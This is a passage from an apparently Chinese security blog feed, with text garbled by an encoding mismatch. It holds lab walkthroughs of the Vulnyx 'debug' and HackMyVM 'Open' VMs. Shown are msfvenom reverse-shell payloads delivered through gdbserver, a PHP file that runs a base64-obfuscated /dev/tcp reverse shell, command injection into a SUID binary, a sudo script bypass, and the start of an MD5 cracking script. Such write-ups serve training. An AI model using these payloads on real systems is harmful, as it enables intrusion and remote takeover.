    <content type="html"><![CDATA[<p>ç»å†äº†å¾ˆå¤šäº‹æƒ…ï¼Œæ¥è¿‘æ­»äº¡ï¼Œåˆè¢«æ•‘å›æ¥ï¼Œä½äº†é™¢ï¼Œæ¯å¤©ç†ç–—ï¼Œåƒè¯ï¼Œçœ‹ç€èº«è¾¹çš„ç—…å‹æ¥æ¥å¾€å¾€ã€‚</p><p>æ£€æŸ¥åšå®Œäº†å…ˆé‡æ‹¾ä¸€ä¸‹é¶æœºå§</p><p>é¶æœºipï¼š192.168.56.169</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.56.169 -p- --min-rate=1000 -A<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-27 00:16 EDT<br>Nmap scan report for bogon (192.168.56.169)<br>Host is up (0.0011s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)<br>|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)<br>|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.61 ((Debian))<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>|_http-server-header: Apache/2.4.61 (Debian)<br>8080/tcp  open  http    Apache httpd 2.4.61 ((Debian))<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-server-header: Apache/2.4.61 (Debian)<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>20500/tcp open  unknown<br>MAC Address: 08:00:27:75:CB:49 (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   1.07 ms bogon (192.168.56.169)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 24.38 seconds<br><br></code></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®80ç«¯å£å’Œ8080ç«¯å£çœ‹åˆ°æ˜¾ç¤ºå¦‚ä¸‹ç•Œé¢ã€‚</p><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/vmware_9uhyInU2oh.png"></p><p>ä¹‹åå°è¯•dirsearchï¼Œferobusterç­‰å¤šç§ç›®å½•çˆ†ç ´å·¥å…·çˆ†ç ´æ— æœï¼Œæ•…æ”¾å¼ƒå°è¯•ï¼Œå†³å®šå…ˆå»çœ‹çœ‹20500ç«¯å£æ˜¯ä»€ä¹ˆï¼Œç½‘ä¸Šæ²¡æœ‰æœåˆ°å…³äºç«¯å£çš„ä¿¡æ¯ï¼Œæ¨æµ‹æ˜¯ä¸ªè‡ªå®šä¹‰æœåŠ¡ã€‚</p><p>curlä¸€ä¸‹ä»ç„¶æ²¡æœ‰ååº”ï¼ŒæŸ¥çœ‹UDPæœåŠ¡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sU --min-rate 1000 192.168.56.169<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-27 00:23 EDT<br>Nmap scan report for bogon (192.168.56.169)<br>Host is up (0.00070s latency).<br>Not shown: 986 open|filtered udp ports (no-response)<br>PORT      STATE  SERVICE<br>161/udp   open   snmp<br>500/udp   closed isakmp<br>517/udp   closed talk<br>623/udp   closed asf-rmcp<br>998/udp   closed puparp<br>1434/udp  closed ms-sql-m<br>2148/udp  closed veritas-ucl<br>5353/udp  closed zeroconf<br>17939/udp closed unknown<br>21212/udp closed unknown<br>24606/udp closed unknown<br>42577/udp closed unknown<br>47808/udp closed bacnet<br>49185/udp closed unknown<br>MAC Address: 08:00:27:75:CB:49 (Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds<br><br><br></code></pre></td></tr></table></figure><p>å‘ç°snmpæœåŠ¡æ˜¯å¼€ç€çš„ï¼Œå‡†å¤‡æšä¸¾ã€‚</p><p>ä½†æ˜¯é»˜è®¤çš„publicç”¨ä¸äº†ï¼Œä½¿ç”¨onesixtyoneçˆ†ç ´ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">snmp-check 192.168.56.169<br>snmp-check v1.9 - SNMP enumerator<br>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)<br><br>[+] Try to connect to 192.168.56.169:161 using SNMPv1 and community &#x27;public&#x27;<br><br>[!] 192.168.56.169:161 SNMP request timeout<br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">onesixtyone</span> -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <span class="hljs-number">192.168.56.169</span> -w <span class="hljs-number">100</span><br><span class="hljs-attribute">Scanning</span> <span class="hljs-number">1</span> hosts, <span class="hljs-number">120</span> communities<br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">56</span>.<span class="hljs-number">169</span><span class="hljs-meta"> [network] Linux debug 5.10.0-32-amd64 #1 SMP Debian 5.10.223-1 (2024-08-10) x86_64</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°ç›®æ ‡ç³»ç»Ÿçš„ SNMP ç¤¾åŒºå­—ç¬¦ä¸²ä¸º <strong><code>network</code></strong>ï¼Œç»§ç»­å®ä»¥smnp-checkï¼Œå‘ç°gdbæœåŠ¡ï¼Œå¹¶æ˜ å°„äºå¤–ç½‘çš„20500ç«¯å£ä¸Šã€‚ï¼ˆé¡ºä¾¿å‘ç°å†…ç½‘è¿˜å¼€äº†ä¸ªç«¯å£9000ï¼‰</p><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/vmware_z5nH0VHnrJ.png"></p><h3 id="GetKiller"><a href="#GetKiller" class="headerlink" title="GetKiller"></a>GetKiller</h3><hr><p>æ„é€ æ¶æ„elfæ–‡ä»¶å‡†å¤‡ä¸Šä¼ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.104 LPORT=4444 PrependFork=true -f elf -o binary.elf<br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gradle">(gdb) target extended-remote <span class="hljs-number">192.168</span>.<span class="hljs-number">56.169</span>:<span class="hljs-number">20500</span><br>Remote debugging using <span class="hljs-number">192.168</span>.<span class="hljs-number">56.169</span>:<span class="hljs-number">20500</span><br>Reading <span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span> <span class="hljs-keyword">from</span> remote target...<br>Reading <span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span> <span class="hljs-keyword">from</span> remote target...<br>Reading symbols <span class="hljs-keyword">from</span> target:<span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span>...<br>(No debugging symbols found in target:<span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span>)<br>Reading <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> remote target...<br>Reading <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> remote target...<br>Reading symbols <span class="hljs-keyword">from</span> target:<span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>...<br>(No debugging symbols found in target:<span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>)<br><span class="hljs-number">0</span>x00007ffff7fd3090 in ?? () <span class="hljs-keyword">from</span> target:<span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span><br>(gdb) remote put binary.elf <span class="hljs-regexp">/tmp/</span>binary.elf<br>Successfully sent <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;binary.elf&quot;</span>.<br>(gdb) set remote exec-<span class="hljs-keyword">file</span> <span class="hljs-regexp">/tmp/</span>binary.elf<br>(gdb) run<br>The program being debugged has been started already.<br>Start it <span class="hljs-keyword">from</span> the beginning? (y or n) y<br>Starting program: target:<span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span> <br>Reading <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> remote target...<br>Reading <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> remote target...<br>[Detaching after fork <span class="hljs-keyword">from</span> child process <span class="hljs-number">993</span>]<br>[Inferior <span class="hljs-number">1</span> (process <span class="hljs-number">992</span>) exited normally]<br>(gdb) <br><br></code></pre></td></tr></table></figure><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/vmware_DpcBMuo20I.png"></p><p>ä¹‹åå†™ä¸ªå…¬é’¥æ–¹ä¾¿è¿›å»ã€‚</p><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>ç”¨chiselæŠŠåˆšåˆšçš„9000ç«¯å£è½¬å‘å‡ºæ¥ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">killer@debug:/home/killer$ chmod +x chisel <br>killer@debug:/home/killer$ cat user.txt <br>killer@debug:/home/killer$ chisel client 192.168.56.104:9999 R:9000:127.0.0.1:9000<br>2025/10/27 05:58:23 client: Connecting to ws://192.168.56.104:9999<br>2025/10/27 05:58:23 client: Connected (Latency 956.899Âµs)<br></code></pre></td></tr></table></figure><p>ç½‘é¡µè®¿é—®æç¤ºmethod not allowedã€‚</p><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/vmware_5SPsj9Q9Qr.png"></p><p>æ¢æˆPUTæ–¹æ³•è¯•ä¸€è¯•ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl 127.0.0.1:9000 -X PUT<br>&#123;&quot;status&quot;:&quot;ok&quot;,&quot;filename&quot;:&quot;id_1761541695&quot;,&quot;size&quot;:0&#125;                                                                                                                                                           <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]<br>â””â”€# curl 127.0.0.1:9000 -X PUT<br>&#123;&quot;status&quot;:&quot;ok&quot;,&quot;filename&quot;:&quot;id_1761541699&quot;,&quot;size&quot;:0&#125;  <br></code></pre></td></tr></table></figure><p>çœ‹èµ·æ¥å¯ä»¥ä¼ æ–‡ä»¶ï¼Œå¼€å§‹æƒ³ç€ä¼ é©¬ï¼Œä½†æ˜¯ä»–ä¼šæŠŠæ–‡ä»¶åéšæœºã€‚</p><p>è¿™é‡Œæƒ³äº†å¥½ä¹…æœ€åå»çœ‹è€å¤§çš„å¤ç›˜è§†é¢‘æ‰çŸ¥é“æœ‰ä¸€ä¸ªå‚æ•°è¦fuzzï¼Œæ˜¯nameã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -s 127.0.0.1:9000/?name=3.php -X PUT     <br>&#123;&quot;status&quot;:&quot;ok&quot;,&quot;filename&quot;:&quot;3.php&quot;,&quot;size&quot;:0&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/AntSword_8eNzrEUAjh.png"></p><p>ä¼ ä¸ªä¸€å¥è¯æœ¨é©¬è¿ä¸Šå»å°±rootäº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>Vulnyx</tag>
      
      <tag>åŸŸ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Open</title>
    <link href="/2025/08/03/HackMyVM-Open/"/>
    <url>/2025/08/03/HackMyVM-Open/</url>
    
    <content type="html"><![CDATA[<p>é¶æœºIPï¼š192.168.56.130</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.56.130<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-03 08:23 EDT<br>Nmap scan report for open.dsz (192.168.56.130)<br>Host is up (0.00048s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:5E:25:AE (Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds<br></code></pre></td></tr></table></figure><p>è®¿é—®80ç«¯å£æç¤ºè·³è½¬åŸŸåopen .dsz , æ”¾åˆ°hosté‡Œã€‚</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p><img src="/2025/08/03/HackMyVM-Open/vmware_1P3r6JLm4W.png"></p><p>è®¿é—®å¾—åˆ°ä¸€ä¸ªurlç•Œé¢ï¼Œæç¤ºæœ‰RFIï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼‰</p><p>åœ¨æ”»å‡»æœºä¸Šèµ·ä¸ªhttpæœåŠ¡ï¼ˆpython3 -m http 80ï¼‰åå¼¹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">cat <span class="hljs-number">1</span>.php <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNDQ0NCAwPiYxKSAm|base64 -d|bash&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]<br>â””â”€<span class="hljs-comment"># ./penelope.py</span><br>[+] Listening <span class="hljs-keyword">for</span> reverse shells on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4444</span> â†’  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> â€¢ <span class="hljs-number">192.168</span>.<span class="hljs-number">21.128</span> â€¢ <span class="hljs-number">192.168</span>.<span class="hljs-number">56.104</span> â€¢ <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span> â€¢ <span class="hljs-number">172.18</span>.<span class="hljs-number">0.1</span><br>â¤  ğŸ  Main <span class="hljs-title function_ invoke__">Menu</span> (m) ğŸ’€ <span class="hljs-title function_ invoke__">Payloads</span> (p) ğŸ”„ <span class="hljs-title function_ invoke__">Clear</span> (Ctrl-L) ğŸš« <span class="hljs-title function_ invoke__">Quit</span> (q/Ctrl-C)<br>[+] Got reverse shell <span class="hljs-keyword">from</span> Open-<span class="hljs-number">192.168</span>.<span class="hljs-number">56.130</span>-Linux-x86_64 ğŸ˜ Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br>[+] Attempting to upgrade shell to PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! ğŸ’ª<br>[+] Interacting with session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/Open~<span class="hljs-number">192.168</span>.<span class="hljs-number">56.130</span>_Linux_x86_64/<span class="hljs-number">2025_08_03</span>-<span class="hljs-number">06_46_03</span>-<span class="hljs-number">181</span>.log ğŸ“œ<br><br>wwwdataèƒ½ç›´æ¥è¯»userflagï¼Œå¾ˆè‰¯å¿ƒ<br><br></code></pre></td></tr></table></figure><h3 id="GetMiao"><a href="#GetMiao" class="headerlink" title="GetMiao"></a>GetMiao</h3><hr><p>æƒ¯ä¾‹çœ‹æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Open:/opt$ find / -type f -perm -4000 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br>/opt/echo<br><br></code></pre></td></tr></table></figure><p>catäº†ä¸€ä¸‹è¿™ä¸ªechoå‘ç°å­˜åœ¨å‘½ä»¤æ³¨å…¥ç‚¹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Open:/opt$ ./echo &quot;&#x27;; printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvOTk5OSAwPiYxKSAm|base64 -d|bash; echo &#x27;&quot;<br>æ‰§è¡Œå‘½ä»¤: echo &#x27;[ç”¨æˆ·è¾“å…¥]: &#x27;; printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvOTk5OSAwPiYxKSAm|base64 -d|bash; echo &#x27;&#x27;<br>[ç”¨æˆ·è¾“å…¥]: <br><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>â¤  ğŸ  Main Menu (m) ğŸ’€ Payloads (p) ğŸ”„ Clear (Ctrl-L) ğŸš« Quit (q/Ctrl-C)<br>[+] Got reverse shell from Open-192.168.56.130-Linux-x86_64 ğŸ˜ Assigned SessionID &lt;1&gt;<br>[+] Attempting to upgrade shell to PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! ğŸ’ª<br>[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/Open~192.168.56.130_Linux_x86_64/2025_08_03-07_29_25-362.log ğŸ“œ<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><br>ä¹‹åå†™ä¸ªå…¬é’¥æ–¹ä¾¿è¿›å»ã€‚<br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">miao@Open:~$ sudo -l<br>Matching Defaults entries for miao on Open:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User miao may run the following commands on Open:<br>    (ALL) NOPASSWD: /opt/hello.sh<br>miao@Open:~$ sudo /opt/hello.sh dsz<br>miao@Open:~$ cat /opt/hello.sh<br>PATH=/usr/bin<br><br>[ -n &quot;$1&quot; ] || exit 1<br>[ &quot;$1&quot; = &quot;dsz&quot; ] &amp;&amp; exit 2<br><span class="hljs-meta prompt_">#</span><span class="language-bash">[ <span class="hljs-variable">$1</span> = <span class="hljs-string">&quot;dsz&quot;</span> ] &amp;&amp; <span class="hljs-built_in">cat</span> /root/password.txt | <span class="hljs-built_in">md5sum</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span></span><br>[ $1 = &quot;dsz&quot; ] &amp;&amp; cat /root/password.txt<br><br>echo &quot;Goodbye!&quot;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå­˜åœ¨å‘½ä»¤æ³¨å…¥ç‚¹ï¼Œæœ€åçš„$1æ²¡ç”¨åŒå¼•å·åŒ…è£¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /opt/hello.sh <span class="hljs-string">&quot;x -o dsz&quot;</span><br>6cd1f22e65d26246530ff7a2528144e3<br>Goodbye!<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨è¿™æ ·çš„é€»è¾‘åˆ¤æ–­ç»•è¿‡ï¼Œä¹Ÿæœ‰æ›´ç®€å•çš„æ–¹æ¡ˆç›´æ¥åŠ ä¸ªç©ºæ ¼å°±å¯ä»¥ã€‚</p><p>æ‹¿åˆ°md5åå°è¯•äº†å¾ˆé•¿æ—¶é—´ä¹Ÿæ²¡æœ‰çˆ†ç ´æˆåŠŸï¼Œè¿™é‡Œå›çœ‹ä¹‹å‰çš„è„šæœ¬ï¼Œå‘ç°è„šæœ¬ç»™å‡ºmd5çš„æ–¹å¼æ˜¯é€šè¿‡catï¼Œæ‰€ä»¥md5æœ«å°¾ä¼šå­˜åœ¨ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ï¼ˆechoåŠ å‚æ•°-nè¾“å‡ºä¸å¸¦æ¢è¡Œç¬¦)</p><p><img src="/2025/08/03/HackMyVM-Open/vmware_nvqzMhlQXH.png"></p><p>ç”¨pythonè„šæœ¬çˆ†ç ´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># é…ç½®å‚æ•°</span><br>DICTIONARY_PATH = <span class="hljs-string">&#x27;rockyou.txt&#x27;</span><br>TARGET_HASH = <span class="hljs-string">&#x27;6cd1f22e65d26246530ff7a2528144e3&#x27;</span><br>MAX_THREADS = <span class="hljs-number">1000</span><br><br><span class="hljs-comment"># å…¨å±€æ§åˆ¶å˜é‡</span><br>found = <span class="hljs-literal">False</span><br>lock = threading.Lock()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_password</span>(<span class="hljs-params">word_bytes</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è®¡ç®— word_bytes + \n çš„ MD5ï¼Œè‹¥åŒ¹é…åˆ™æ‰“å°ç»“æœå¹¶é€€å‡º</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">global</span> found<br>    <span class="hljs-keyword">if</span> found:<br>        <span class="hljs-keyword">return</span><br><br>    <span 